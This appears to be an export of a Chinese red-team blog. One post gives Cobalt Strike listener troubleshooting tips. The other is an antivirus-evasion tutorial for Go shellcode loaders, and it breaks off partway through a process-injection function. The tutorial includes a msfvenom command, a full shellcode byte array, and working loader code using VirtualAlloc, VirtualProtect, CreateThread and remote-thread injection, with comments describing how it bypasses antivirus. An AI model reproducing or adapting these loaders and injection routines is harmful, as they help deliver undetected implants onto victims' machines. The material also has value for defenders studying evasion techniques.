    <url>/cobaltstrike%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文内容是基于cs4.3版本，讲了一些大家会遇到的一些坑。</p>
<span id="more"></span>

<h2 id="https-listener在win7和win2008下相关问题"><a href="#https-listener在win7和win2008下相关问题" class="headerlink" title="https listener在win7和win2008下相关问题"></a>https listener在win7和win2008下相关问题</h2><p>很多人会遇到使用https无法上线的情况，因为HTTPS Listener 在 Win7 这种环境上线时候，会尝试每种 TLS 版本的协议，如 TLS 1.2，TLS 1.1 等。但是我经过抓包发现，我生成的 exe 只协商 TLS 1.2。</p>
<p><img src="/cobaltstrike%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/40d4ae4023b1fc7972a6be215a9ae049.png" alt="截图"></p>
<p>原因是因为 JDK 更新，把所有版本的安全策略进行调整(包括 JDK8,之前装的不影响)，禁用了 TLSv1,TLSv1.1 的加密套件，所以导致 Teamserver 端不支持这两种协商算法。</p>
<p><img src="/cobaltstrike%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/e233b313879870749f4122414bdee824.png" alt="截图"></p>
<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>cd &#x2F;usr&#x2F;java&#x2F;jdk具体版本看个人机器&#x2F;jre&#x2F;lib&#x2F;security</p>
<p>编辑 java.security 文件，搜索 jdk.tls.disabledAlgorithms 关键字，大概在 730 行左右，如下图：</p>
<p><img src="/cobaltstrike%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/b0c71175aba478c8d046c7459addbb51.png" alt="截图"></p>
<p>删除红框中的内容，然后重启teamserver即可成功上线</p>
<p><img src="/cobaltstrike%E7%9B%B8%E5%85%B3%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/02db8ff0a071d46e6e8fe24076a4784b.png" alt="截图"></p>
<h2 id="socks4连通性问题"><a href="#socks4连通性问题" class="headerlink" title="socks4连通性问题"></a>socks4连通性问题</h2><p>经测试：</p>
<p>当teamserver配置profile时，socks4代理不可用</p>
<p>当teamserver在内网，端口映射上线时，socks4代理不可用</p>
<p>dns上线时无法使用socks代理</p>
<h2 id="DNS上线53端口占用问题"><a href="#DNS上线53端口占用问题" class="headerlink" title="DNS上线53端口占用问题"></a>DNS上线53端口占用问题</h2><p>先停用 systemd-resolved 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop systemd-resolved</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>cobaltstrike</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>问题解决</tag>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title>golang shellcode免杀</title>
    <url>/golang-shellcode%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h2 id="获得原始shellcode"><a href="#获得原始shellcode" class="headerlink" title="获得原始shellcode"></a>获得原始shellcode</h2><p>注意：生成shellcode时需要根据系统架构选择x86或者x64位shellcode，否则可能无法执行或者导致注入的原始进程崩溃。</p>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>弹出计算机测试使用的shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=calc.exe -f csharp</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byte[] buf = new byte[276] &#123;0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="cobalt-strike"><a href="#cobalt-strike" class="headerlink" title="cobalt strike"></a>cobalt strike</h3><p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/2bcb3a1e481256a9a47f9d93346bb071.png" alt="截图"></p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/3b422e414af66bd7a75e7861a8cf33ca.png" alt="截图"></p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/651774b61241536ba1ce613f3200a8d0.png" alt="截图"></p>
<p>此时替换<code>斜杠</code>为<code>,0</code></p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/d19ac366bcc658924ec0d386c118a55d.png" alt="截图"></p>
<p><img src="/golang-shellcode%E5%85%8D%E6%9D%80/e064bd945ac836a5678f120b71c089b7.png" alt="截图"></p>
<p>此时得到可以放入golang的shellcode</p>
<h2 id="需要用到的包"><a href="#需要用到的包" class="headerlink" title="需要用到的包"></a>需要用到的包</h2><p>“golang.org&#x2F;x&#x2F;sys&#x2F;windows” 提供系统函数调用支持，可以直接操作系统底层接口，提供dll函数调用支持。</p>
<p>“golang.org&#x2F;x&#x2F;sys&#x2F;syscall” Syscall可能被弃用，但仍然是一种依赖，可以直接利用，是系统底层包，根据系统的不同，该包各不相同。</p>
<p>“unsafe” 用来直接操作系统内存。</p>
<p>“github.com&#x2F;mitchellh&#x2F;go-ps” 用来操作进程</p>
<p>“C” 启用CGO特性，为了导出dll</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>一个简单的shellcode加载器应该有以下几个部分：读取并处理shellcode、调用win api为shellcode分配内存、将shellcode写入内存，最后执行内存中的shellcode。</p>
<h2 id="shellcode的多种加载方式"><a href="#shellcode的多种加载方式" class="headerlink" title="shellcode的多种加载方式"></a>shellcode的多种加载方式</h2><h3 id="直接系统调用-创建线程"><a href="#直接系统调用-创建线程" class="headerlink" title="直接系统调用|创建线程"></a>直接系统调用|创建线程</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">教程地址：https://www.blackhillsinfosec.com/webcast-shellcode-execution-with-golang/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;golang.org/x/sys/windows&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/exec CMD=calc.exe -f csharp</span></span><br><span class="line"><span class="comment">// 原始payload</span></span><br><span class="line"><span class="keyword">var</span> s = []<span class="type">byte</span>&#123;</span><br><span class="line">	<span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xc0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>,</span><br><span class="line">	<span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>,</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x52</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x8b</span>, <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line">	<span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,</span><br><span class="line">	<span class="number">0xac</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0x4c</span>,</span><br><span class="line">	<span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>, <span class="number">0x39</span>, <span class="number">0xd1</span>, <span class="number">0x75</span>, <span class="number">0xd8</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>,</span><br><span class="line">	<span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>,</span><br><span class="line">	<span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>,</span><br><span class="line">	<span class="number">0x41</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>, <span class="number">0x57</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x5d</span>, <span class="number">0x48</span>, <span class="number">0xba</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x31</span>, <span class="number">0x8b</span>, <span class="number">0x6f</span>,</span><br><span class="line">	<span class="number">0x87</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xbb</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xa6</span>, <span class="number">0x95</span>, <span class="number">0xbd</span>, <span class="number">0x9d</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xd5</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x28</span>, <span class="number">0x3c</span>, <span class="number">0x06</span>, <span class="number">0x7c</span>, <span class="number">0x0a</span>, <span class="number">0x80</span>, <span class="number">0xfb</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0xbb</span>,</span><br><span class="line">	<span class="number">0x47</span>, <span class="number">0x13</span>, <span class="number">0x72</span>, <span class="number">0x6f</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>,</span><br><span class="line">	<span class="number">0x63</span>, <span class="number">0x2e</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x00</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	method2_CreatThread(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法1：直接调用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">method1_SysCall</span><span class="params">(sc []<span class="type">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 懒加载kernel32.dll，创建一个*windows.LazyDll对象</span></span><br><span class="line">	<span class="comment">// kernel32.dll控制着系统的内存管理、数据的输入输出操作和中断处理</span></span><br><span class="line">	kernel32 := windows.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用newProc访问kernel32中的命名函数：RtlMoveMemory</span></span><br><span class="line">	<span class="comment">// RtlMoveMemory用来将源内存块的内容复制到目标内存块，并支持重叠的源内存块和目标内存块。</span></span><br><span class="line">	<span class="comment">// 此处获取RtlMoveMomory对象</span></span><br><span class="line">	RtlMoveMemory := kernel32.NewProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// windows提供的底层方法,用来更改内存状态</span></span><br><span class="line">	<span class="comment">// 在调用进程的虚拟地址空间中保留、提交或更改页面区域的状态。此函数分配的内存自动初始化为零。</span></span><br><span class="line">	<span class="comment">// 此处调用分配了一块内存空间</span></span><br><span class="line">	addr, err := windows.VirtualAlloc(<span class="type">uintptr</span>(<span class="number">0</span>), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] VirtualAlloc():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用RtlMoveMemory将shellcode写入内存</span></span><br><span class="line">	RtlMoveMemory.Call(addr, <span class="type">uintptr</span>(unsafe.Pointer(&amp;sc[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect</span></span><br><span class="line">	<span class="keyword">var</span> oldProtect <span class="type">uint32</span></span><br><span class="line">	<span class="comment">//VirtualProtect在调用进程的虚拟地址空间中更改对已提交页面区域的保护</span></span><br><span class="line">	err = windows.VirtualProtect(addr, <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.PAGE_EXECUTE_READWRITE, &amp;oldProtect)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] VirtualProtect():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：在进程中创建子线程</span></span><br><span class="line"><span class="comment">// method2: Creating thread in same process</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">method2_CreatThread</span><span class="params">(sc []<span class="type">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 加载方法</span></span><br><span class="line">	kernel32 := windows.NewLazyDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	<span class="comment">// Runtime library move Memory 用来复制内存</span></span><br><span class="line">	RtlMoveMemory := kernel32.NewProc(<span class="string">&quot;RtlMoveMemory&quot;</span>)</span><br><span class="line">	<span class="comment">// CreateThread 用来创建线程</span></span><br><span class="line">	CreateThread := kernel32.NewProc(<span class="string">&quot;CreateThread&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分配内存 alloc is allocation 分配的意思,已经内置在golang的windows库中</span></span><br><span class="line">	<span class="comment">//参数1：要分配的区域的起始地址 参数2:区域的大小以字节为单位 参数3:内存分配类型 参数4:访问类型</span></span><br><span class="line">	<span class="comment">// 参数3解析：要在一个步骤中保留和提交页面，请使用调用VirtualAllocMEM_COMMIT | MEM_RESERVE。</span></span><br><span class="line">	<span class="comment">// 参数4解析：区域不可执行代码，应用程序可以读写该区域。</span></span><br><span class="line">	addr, err := windows.VirtualAlloc(<span class="type">uintptr</span>(<span class="number">0</span>), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] VirtualAllic():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 写入内存</span></span><br><span class="line">	<span class="comment">// copy shellcode into allocated memory</span></span><br><span class="line">	RtlMoveMemory.Call(addr, <span class="type">uintptr</span>(unsafe.Pointer(&amp;sc[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> oldProtect <span class="type">uint32</span></span><br><span class="line">	<span class="comment">// 更改内存状态，之前是READWRITE(为了绕过AV),现在改成PAGE_EXECUTE_READ(为了绕过AV)</span></span><br><span class="line">	<span class="comment">// VirtualProtect:在调用进程的虚拟地址空间中更改对已提交页面区域的保护</span></span><br><span class="line">	<span class="comment">// 参数1：起始地址 参数2：内存长度 参数3：要更改的类型</span></span><br><span class="line">	<span class="comment">// 参数4：指向变量的指针，该变量接收指定页面区域中第一页的先前访问保护值。如果此参数为NULL或未指向有效变量，则函数失败。</span></span><br><span class="line">	<span class="comment">// 执行完成后，oldProtect == PAGE_READWRITE = 0x00000004 == 4</span></span><br><span class="line">	err = windows.VirtualProtect(addr, <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.PAGE_EXECUTE_READ, &amp;oldProtect)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] VirtualProtect():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(oldProtect)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建线程，六个参数</span></span><br><span class="line">	<span class="comment">// https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</span></span><br><span class="line">	<span class="comment">// 参数1：线程属性，确定返回的句柄是否可以被子进程继承</span></span><br><span class="line">	<span class="comment">// 参数2：堆栈的初始大小，以字节为单位，如果此参数为零，则新线程使用可执行文件的默认大小</span></span><br><span class="line">	<span class="comment">// 参数3：指向要由线程执行的应用程序定义函数的指针，即指向内存</span></span><br><span class="line">	<span class="comment">// 参数4：指向要传递给线程的变量的指针</span></span><br><span class="line">	<span class="comment">// 参数5：控制线程创建的标志。如果为0，线程在创建后立即运行。</span></span><br><span class="line">	<span class="comment">// 参数6：指向接收线程标识符的变量的指针。如果此参数为 NULL，则不返回线程标识符。</span></span><br><span class="line">	<span class="comment">// 返回值：如果函数成功，则返回值是新线程的句柄。如果函数失败，则返回值为NULL。要获取扩展的错误信息，请调用 GetLastError。</span></span><br><span class="line">	thread, _, err := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, addr, <span class="type">uintptr</span>(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] Created Thread():%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(err.Error())</span><br><span class="line"></span><br><span class="line">	<span class="comment">//保持程序运行</span></span><br><span class="line">	_, _ = windows.WaitForSingleObject(windows.Handle(thread), <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> runsc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line"></span><br><span class="line">	ps <span class="string">&quot;github.com/mitchellh/go-ps&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.org/x/sys/windows&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Method3injectProcess</span><span class="params">(sc []<span class="type">byte</span>, proc <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	Pid := findProcess(proc)</span><br><span class="line">	<span class="keyword">if</span> Pid == <span class="number">0</span> || Pid == <span class="number">-1</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">`[!] Can&#x27;t find a process that can be injected, or the process cannot be injected!`</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kernel32 := windows.NewLazySystemDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">	<span class="comment">//在指定进程的虚拟地址空间内保留、提交或更改内存区域的状态。该函数将其分配的内存初始化为零。</span></span><br><span class="line">	VirtualAllocEx := kernel32.NewProc(<span class="string">&quot;VirtualAllocEx&quot;</span>)</span><br><span class="line">	<span class="comment">//在指定进程的虚拟地址空间中更改对已提交页面区域的保护</span></span><br><span class="line">	VirtualProtectEx := kernel32.NewProc(<span class="string">&quot;VirtualProtectEx&quot;</span>)</span><br><span class="line">	<span class="comment">//将数据写入指定进程中的内存区域。要写入的整个区域必须可访问，否则操作将失败。</span></span><br><span class="line">	WriteProcessMemory := kernel32.NewProc(<span class="string">&quot;WriteProcessMemory&quot;</span>)</span><br><span class="line">	<span class="comment">//创建在另一个进程的虚拟地址空间中运行的线程，并可选择指定扩展属性，例如处理器组关联性。</span></span><br><span class="line">	CreateRemoteThreadEx := kernel32.NewProc(<span class="string">&quot;CreateRemoteThreadEx&quot;</span>)</span><br><span class="line"></span><br><span class="line">	openProcess, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE, <span class="literal">false</span>, <span class="type">uint32</span>(Pid))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] Open process err:%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	addr, _, err := VirtualAllocEx.Call(<span class="type">uintptr</span>(openProcess), <span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !strings.Contains(err.Error(), <span class="string">&quot;successfully&quot;</span>) &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] Virtuallloc err:%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	_, _, err = WriteProcessMemory.Call(<span class="type">uintptr</span>(openProcess), addr, <span class="type">uintptr</span>(unsafe.Pointer(&amp;sc[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !strings.Contains(err.Error(), <span class="string">&quot;successfully&quot;</span>) &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] WriteProcessMemory err:%s&quot;</span>, err.Error()))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	op := <span class="number">0</span></span><br><span class="line">	_, _, err = VirtualProtectEx.Call(<span class="type">uintptr</span>(openProcess), addr, <span class="type">uintptr</span>(<span class="built_in">len</span>(sc)), windows.PAGE_EXECUTE_READ, <span class="type">uintptr</span>(unsafe.Pointer(&amp;op)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; !strings.Contains(err.Error(), <span class="string">&quot;successfully&quot;</span>) &#123;</span><br><span class="line">		<span class="built_in">panic</span>(fmt.Sprintf(<span class="string">&quot;[!] 